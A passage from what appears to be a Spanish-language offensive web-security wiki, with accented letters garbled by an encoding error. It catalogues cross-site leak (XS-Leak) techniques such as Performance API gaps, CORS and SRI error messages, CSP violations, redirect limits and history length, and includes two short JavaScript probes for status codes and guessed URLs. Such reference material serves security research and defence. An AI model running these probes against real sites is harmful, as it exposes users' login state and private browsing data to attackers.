M√°s all√° de las mediciones de tiempo, la Performance API puede ser aprovechada para obtener informaci√≥n relacionada con la seguridad. Por ejemplo, la presencia o ausencia de p√°ginas en el objeto `performance` en Chrome puede indicar la aplicaci√≥n de `X-Frame-Options`. Espec√≠ficamente, si una p√°gina est√° bloqueada para renderizarse en un marco debido a `X-Frame-Options`, no se registrar√° en el objeto `performance`, proporcionando una pista sutil sobre las pol√≠ticas de enmarcado de la p√°gina.

### Error Leak

* **Inclusion Methods**: Frames, HTML Elements
* **Detectable Difference**: C√≥digo de estado
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Una solicitud que resulta en errores no crear√° una entrada de tiempo de recursos.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Es posible **diferenciar entre c√≥digos de estado de respuesta HTTP** porque las solicitudes que conducen a un **error** no **crean una entrada de rendimiento**.

### Style Reload Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: C√≥digo de estado
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Debido a un error del navegador, las solicitudes que resultan en errores se cargan dos veces.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

En la t√©cnica anterior tambi√©n se identificaron dos casos donde errores del navegador en GC llevan a que **los recursos se carguen dos veces cuando fallan al cargar**. Esto resultar√° en m√∫ltiples entradas en la Performance API y, por lo tanto, puede ser detectado.

### Request Merging Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: C√≥digo de estado
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Las solicitudes que resultan en un error no pueden ser fusionadas.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

La t√©cnica se encontr√≥ en una tabla en el documento mencionado, pero no se encontr√≥ ninguna descripci√≥n de la t√©cnica en √©l. Sin embargo, puedes encontrar el c√≥digo fuente verific√°ndolo en [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenido de la p√°gina
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Las respuestas vac√≠as no crean entradas de tiempo de recursos.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Un atacante puede detectar si una solicitud result√≥ en un cuerpo de respuesta HTTP vac√≠o porque **las p√°ginas vac√≠as no crean una entrada de rendimiento en algunos navegadores**.

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenido de la p√°gina
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Usando el XSS Auditor en Security Assertions, los atacantes pueden detectar elementos espec√≠ficos de la p√°gina web al observar alteraciones en las respuestas cuando cargas √∫tiles dise√±adas activan el mecanismo de filtrado del auditor.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

En Security Assertions (SA), el XSS Auditor, originalmente destinado a prevenir ataques de Cross-Site Scripting (XSS), puede ser explotado parad√≥jicamente para filtrar informaci√≥n sensible. Aunque esta funci√≥n incorporada fue eliminada de Google Chrome (GC), a√∫n est√° presente en SA. En 2013, Braun y Heiderich demostraron que el XSS Auditor podr√≠a bloquear inadvertidamente scripts leg√≠timos, llevando a falsos positivos. Bas√°ndose en esto, los investigadores desarrollaron t√©cnicas para extraer informaci√≥n y detectar contenido espec√≠fico en p√°ginas de origen cruzado, un concepto conocido como XS-Leaks, inicialmente reportado por Terada y elaborado por Heyes en una publicaci√≥n de blog. Aunque estas t√©cnicas eran espec√≠ficas para el XSS Auditor en GC, se descubri√≥ que en SA, las p√°ginas bloqueadas por el XSS Auditor no generan entradas en la Performance API, revelando un m√©todo a trav√©s del cual la informaci√≥n sensible podr√≠a seguir siendo filtrada.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Encabezado
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** Un recurso con encabezado X-Frame-Options no crea una entrada de tiempo de recursos.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Si una p√°gina **no est√° permitida** para ser **renderizada** en un **iframe**, no **crea una entrada de rendimiento**. Como resultado, un atacante puede detectar el encabezado de respuesta **`X-Frame-Options`**.\
Lo mismo sucede si usas una etiqueta **embed**.

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: Encabezado
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Las descargas no crean entradas de tiempo de recursos en la Performance API.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Similar a la fuga XS descrita, un **recurso que se descarga** debido al encabezado ContentDisposition, tampoco **crea una entrada de rendimiento**. Esta t√©cnica funciona en todos los navegadores principales.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Redirecci√≥n
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** La entrada de tiempo de recursos filtra el tiempo de inicio de una redirecci√≥n.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Encontramos una instancia de fuga XS que abusa del comportamiento de algunos navegadores que registran demasiada informaci√≥n para solicitudes de origen cruzado. El est√°ndar define un subconjunto de atributos que deben establecerse en cero para recursos de origen cruzado. Sin embargo, en **SA** es posible detectar si el usuario es **redirigido** por la p√°gina objetivo, consultando la **Performance API** y verificando los **datos de tiempo de redirecci√≥n**.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirecci√≥n
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** La duraci√≥n de las entradas de tiempo es negativa cuando ocurre una redirecci√≥n.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

En GC, la **duraci√≥n** para solicitudes que resultan en una **redirecci√≥n** es **negativa** y, por lo tanto, puede ser **distingida** de solicitudes que no resultan en una redirecci√≥n.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Encabezado
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Los recursos protegidos con CORP no crean entradas de tiempo de recursos.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

En algunos casos, la entrada **nextHopProtocol** puede ser utilizada como una t√©cnica de fuga. En GC, cuando se establece el **encabezado CORP**, nextHopProtocol estar√° **vac√≠o**. Ten en cuenta que SA no crear√° una entrada de rendimiento en absoluto para recursos habilitados para CORP.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: Uso de API
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** Detectar si un service worker est√° registrado para un origen espec√≠fico.
* **Code Example**:

Los service workers son contextos de script impulsados por eventos que se ejecutan en un origen. Se ejecutan en segundo plano de una p√°gina web y pueden interceptar, modificar y **almacenar en cach√© recursos** para crear aplicaciones web fuera de l√≠nea.\
Si un **recurso almacenado en cach√©** por un **service worker** se accede a trav√©s de **iframe**, el recurso ser√° **cargado desde la cach√© del service worker**.\
Para detectar si el recurso fue **cargado desde la cach√© del service worker**, se puede utilizar la **Performance API**.\
Esto tambi√©n podr√≠a hacerse con un ataque de tiempo (consulta el documento para m√°s informaci√≥n).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Tiempo
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** Es posible verificar si un recurso fue almacenado en la cach√©.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Usando la [Performance API](xs-search.md#performance-api) es posible verificar si un recurso est√° en cach√©.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Contenido de la p√°gina
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** Es posible recuperar la duraci√≥n de la red de una solicitud desde la API `performance`.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elements (Video, Audio)
* **Detectable Difference**: C√≥digo de estado
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** En Firefox es posible filtrar con precisi√≥n el c√≥digo de estado de una solicitud de origen cruzado.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` interface's message property uniquely identifies resources that load successfully with a distinct string. Un atacante puede explotar esta caracter√≠stica observando el contenido del mensaje, deduciendo as√≠ el estado de respuesta de un recurso de origen cruzado.

### CORS Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** En las Aserciones de Seguridad (SA), los mensajes de error de CORS exponen inadvertidamente la URL completa de las solicitudes redirigidas.
* **Code Example**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Esta t√©cnica permite a un atacante **extraer el destino de la redirecci√≥n de un sitio de origen cruzado** aprovechando c√≥mo los navegadores basados en Webkit manejan las solicitudes CORS. Espec√≠ficamente, cuando se env√≠a una **solicitud habilitada para CORS** a un sitio objetivo que emite una redirecci√≥n basada en el estado del usuario y el navegador posteriormente niega la solicitud, la **URL completa del objetivo de la redirecci√≥n** se revela dentro del mensaje de error. Esta vulnerabilidad no solo revela el hecho de la redirecci√≥n, sino que tambi√©n expone el punto final de la redirecci√≥n y cualquier **par√°metro de consulta sensible** que pueda contener.

### SRI Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** En las Aserciones de Seguridad (SA), los mensajes de error de CORS exponen inadvertidamente la URL completa de las solicitudes redirigidas.
* **Code Example**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un atacante puede explotar **mensajes de error verbosos** para deducir el tama√±o de las respuestas de origen cruzado. Esto es posible debido al mecanismo de Integridad de Subrecursos (SRI), que utiliza el atributo de integridad para validar que los recursos recuperados, a menudo de CDNs, no han sido manipulados. Para que SRI funcione en recursos de origen cruzado, estos deben estar **habilitados para CORS**; de lo contrario, no est√°n sujetos a verificaciones de integridad. En las Aserciones de Seguridad (SA), al igual que el XS-Leak de error CORS, se puede capturar un mensaje de error despu√©s de que una solicitud de recuperaci√≥n con un atributo de integridad falla. Los atacantes pueden **provocar deliberadamente este error** asignando un **valor de hash falso** al atributo de integridad de cualquier solicitud. En SA, el mensaje de error resultante revela inadvertidamente la longitud del contenido del recurso solicitado. Esta fuga de informaci√≥n permite a un atacante discernir variaciones en el tama√±o de la respuesta, allanando el camino para ataques XS-Leak sofisticados.

### CSP Violation/Detection

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Summary:** Permitir solo el sitio web de las v√≠ctimas en el CSP si se accede a √©l intenta redirigir a un dominio diferente, el CSP generar√° un error detectable.
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak puede usar el CSP para detectar si un sitio de origen cruzado fue redirigido a un origen diferente. Esta fuga puede detectar la redirecci√≥n, pero adem√°s, el dominio del objetivo de la redirecci√≥n se filtra. La idea b√°sica de este ataque es **permitir el dominio objetivo en el sitio del atacante**. Una vez que se emite una solicitud al dominio objetivo, este **redirige** a un dominio de origen cruzado. **CSP bloquea** el acceso a √©l y crea un **informe de violaci√≥n utilizado como t√©cnica de fuga**. Dependiendo del navegador, **este informe puede filtrar la ubicaci√≥n objetivo de la redirecci√≥n**.\
Los navegadores modernos no indicar√°n la URL a la que se redirigi√≥, pero a√∫n se puede detectar que se activ√≥ una redirecci√≥n de origen cruzado.

### Cache

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Summary:** Limpia el archivo de la cach√©. Abre la p√°gina objetivo y verifica si el archivo est√° presente en la cach√©.
* **Code Example:**

Los navegadores pueden usar una cach√© compartida para todos los sitios web. Independientemente de su origen, es posible deducir si una p√°gina objetivo ha **solicitado un archivo espec√≠fico**.

Si una p√°gina carga una imagen solo si el usuario ha iniciado sesi√≥n, puedes **invalidar** el **recurso** (para que ya no est√© en cach√© si lo estaba, consulta los enlaces de m√°s informaci√≥n), **realizar una solicitud** que podr√≠a cargar ese recurso y tratar de cargar el recurso **con una solicitud incorrecta** (por ejemplo, usando un encabezado referer demasiado largo). Si la carga del recurso **no gener√≥ ning√∫n error**, es porque estaba **en cach√©**.

### CSP Directive

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Summary:** Las directivas de encabezado CSP pueden ser sondeadas utilizando el atributo iframe CSP, revelando detalles de la pol√≠tica.
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Una nueva caracter√≠stica en Google Chrome (GC) permite a las p√°ginas web **proponer una Pol√≠tica de Seguridad de Contenido (CSP)** estableciendo un atributo en un elemento iframe, con directivas de pol√≠tica transmitidas junto con la solicitud HTTP. Normalmente, el contenido incrustado debe **autorizar esto a trav√©s de un encabezado HTTP**, o se **muestra una p√°gina de error**. Sin embargo, si el iframe ya est√° gobernado por un CSP y la pol√≠tica propuesta no es m√°s restrictiva, la p√°gina se cargar√° normalmente. Este mecanismo abre un camino para que un atacante **detecte directivas CSP espec√≠ficas** de una p√°gina de origen cruzado al identificar la p√°gina de error. Aunque esta vulnerabilidad fue marcada como corregida, nuestros hallazgos revelan una **nueva t√©cnica de fuga** capaz de detectar la p√°gina de error, sugiriendo que el problema subyacente nunca fue completamente abordado.

### **CORP**

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Summary:** Los recursos asegurados con la Pol√≠tica de Recursos de Origen Cruzado (CORP) generar√°n un error cuando se recuperen de un origen no permitido.
* **Code Example**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

El encabezado CORP es una caracter√≠stica de seguridad de la plataforma web relativamente nueva que, cuando se establece, **bloquea las solicitudes de origen cruzado sin CORS al recurso dado**. La presencia del encabezado puede ser detectada, porque un recurso protegido con CORP **generar√° un error cuando se recupere**.

### CORB

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Summary**: CORB puede permitir a los atacantes detectar cuando el **encabezado `nosniff` est√° presente** en la solicitud.
* **Code Example**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Consulta el enlace para m√°s informaci√≥n sobre el ataque.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Summary**: Si el encabezado Origin se refleja en el encabezado `Access-Control-Allow-Origin`, es posible verificar si un recurso ya est√° en la cach√©.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

En caso de que el **encabezado Origin** est√© siendo **reflejado** en el encabezado `Access-Control-Allow-Origin`, un atacante puede abusar de este comportamiento para intentar **recuperar** el **recurso** en modo **CORS**. Si **no se** genera un **error**, significa que fue **recuperado correctamente de la web**, si se genera un error, es porque fue **accedido desde la cach√©** (el error aparece porque la cach√© guarda una respuesta con un encabezado CORS que permite el dominio original y no el dominio del atacante)**.**\
Ten en cuenta que si el origen no se refleja pero se usa un comod√≠n (`Access-Control-Allow-Origin: *`), esto no funcionar√°.

## Readable Attributes Technique

### Fetch Redirect

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Status Code
* **More info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Summary:** GC y SA permiten verificar el tipo de respuesta (opaque-redirect) despu√©s de que se completa la redirecci√≥n.
* **Code Example**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Al enviar una solicitud utilizando la API Fetch con `redirect: "manual"` y otros par√°metros, es posible leer el atributo `response.type` y si es igual a `opaqueredirect`, entonces la respuesta fue una redirecci√≥n.

### COOP

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Summary:** Las p√°ginas protegidas por la Pol√≠tica de Apertura de Origen Cruzado (COOP) impiden el acceso desde interacciones de origen cruzado.
* **Code Example**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un atacante es capaz de deducir la presencia del encabezado de la Pol√≠tica de Apertura de Origen Cruzado (COOP) en una respuesta HTTP de origen cruzado. COOP es utilizado por aplicaciones web para impedir que sitios externos obtengan referencias de ventana arbitrarias. La visibilidad de este encabezado puede discernirse al intentar acceder a la **referencia `contentWindow`**. En escenarios donde COOP se aplica condicionalmente, la **propiedad `opener`** se convierte en un indicador revelador: es **indefinida** cuando COOP est√° activo y **definida** en su ausencia.

### URL Max Length - Server Side

* **Inclusion Methods**: Fetch API, HTML Elements
* **Detectable Difference**: Status Code / Content
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Summary:** Detectar diferencias en las respuestas porque la longitud de la respuesta de redirecci√≥n podr√≠a ser demasiado grande y el servidor responde con un error y se genera una alerta.
* **Code Example**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Si una redirecci√≥n del lado del servidor utiliza **entrada del usuario dentro de la redirecci√≥n** y **datos adicionales**. Es posible detectar este comportamiento porque generalmente **los servidores** tienen un **l√≠mite de longitud de solicitud**. Si los **datos del usuario** son de esa **longitud - 1**, porque la **redirecci√≥n** est√° utilizando **esos datos** y **agregando** algo **extra**, generar√° un **error detectable a trav√©s de Eventos de Error**.

Si de alguna manera puedes establecer cookies a un usuario, tambi√©n puedes realizar este ataque **estableciendo suficientes cookies** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) para que con el **aumento del tama√±o de la respuesta** de la **respuesta correcta** se genere un **error**. En este caso, recuerda que si activas esta solicitud desde un mismo sitio, `<script>` enviar√° autom√°ticamente las cookies (as√≠ que puedes verificar errores).\
Un ejemplo de la **bomba de cookies + XS-Search** se puede encontrar en la soluci√≥n prevista de este informe: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` o estar en el mismo contexto generalmente se necesita para este tipo de ataque.

### URL Max Length - Client Side

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code / Content
* **More info**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Summary:** Detectar diferencias en las respuestas porque la longitud de la respuesta de redirecci√≥n podr√≠a ser demasiado grande para una solicitud que se puede notar una diferencia.
* **Code Example**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Seg√∫n la [documentaci√≥n de Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), la longitud m√°xima de URL de Chrome es de 2MB.

> En general, la _plataforma web_ no tiene l√≠mites en la longitud de las URL (aunque 2^31 es un l√≠mite com√∫n). _Chrome_ limita las URL a una longitud m√°xima de **2MB** por razones pr√°cticas y para evitar causar problemas de denegaci√≥n de servicio en la comunicaci√≥n entre procesos.

Por lo tanto, si la **URL de redirecci√≥n respondida es m√°s grande en uno de los casos**, es posible hacer que redirija con una **URL mayor a 2MB** para alcanzar el **l√≠mite de longitud**. Cuando esto sucede, Chrome muestra una p√°gina **`about:blank#blocked`**.

La **diferencia notable** es que si la **redirecci√≥n** fue **completada**, `window.origin` genera un **error** porque un origen cruzado no puede acceder a esa informaci√≥n. Sin embargo, si se **alcanz√≥** el **l√≠mite** y la p√°gina cargada fue **`about:blank#blocked`**, el **origen** de la ventana permanece como el de la **padre**, que es una **informaci√≥n accesible.**

Toda la informaci√≥n adicional necesaria para alcanzar los **2MB** se puede agregar a trav√©s de un **hash** en la URL inicial para que sea **utilizada en la redirecci√≥n**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Max Redirects

* **Inclusion Methods**: Fetch API, Frames
* **Detectable Difference**: Status Code
* **More info**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Summary:** Utiliza el l√≠mite de redirecci√≥n del navegador para determinar la ocurrencia de redirecciones de URL.
* **Code Example**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Si el **n√∫mero m√°ximo** de **redirecciones** a seguir de un navegador es **20**, un atacante podr√≠a intentar cargar su p√°gina con **19 redirecciones** y finalmente **enviar a la v√≠ctima** a la p√°gina probada. Si se genera un **error**, entonces la p√°gina estaba intentando **redirigir a la v√≠ctima**.

### History Length

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Redirects
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Summary:** El c√≥digo JavaScript manipula el historial del navegador y se puede acceder a √©l mediante la propiedad length.
* **Code Example**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

La **API de Historial** permite al c√≥digo JavaScript manipular el historial del navegador, que **guarda las p√°ginas visitadas por un usuario**. Un atacante puede usar la propiedad length como un m√©todo de inclusi√≥n: para detectar navegaci√≥n de JavaScript y HTML.\
**Verificando `history.length`**, haciendo que un usuario **navegue** a una p√°gina, **cambiando** de nuevo a la misma origen y **verificando** el nuevo valor de **`history.length`**.

### History Length with same URL

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Si la URL es la misma que la adivinada
* **Summary:** Es posible adivinar si la ubicaci√≥n de un marco/pop-up est√° en una URL espec√≠fica abusando de la longitud del historial.
* **Code Example**: Abajo

Un atacante podr√≠a usar c√≥digo JavaScript para **manipular la ubicaci√≥n del marco/pop-up a una adivinada** y **inmediatamente** **cambiarla a `about:blank`**. Si la longitud del historial aument√≥, significa que la URL era correcta y tuvo tiempo para **aumentar porque la URL no se recarga si es la misma**. Si no aument√≥, significa que **intent√≥ cargar la URL adivinada** pero porque **inmediatamente despu√©s** carg√≥ **`about:blank`**, la **longitud del historial nunca aument√≥** al cargar la URL adivinada.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Conteo de Marcos

* **M√©todos de Inclusi√≥n**: Marcos, Pop-ups
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumen:** Eval√∫a la cantidad de elementos iframe inspeccionando la propiedad `window.length`.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar el **n√∫mero de marcos en una web** abierta a trav√©s de `iframe` o `window.open` puede ayudar a identificar el **estado del usuario sobre esa p√°gina**.\
Adem√°s, si la p√°gina tiene siempre el mismo n√∫mero de marcos, verificar **continuamente** el n√∫mero de marcos puede ayudar a identificar un **patr√≥n** que podr√≠a filtrar informaci√≥n.

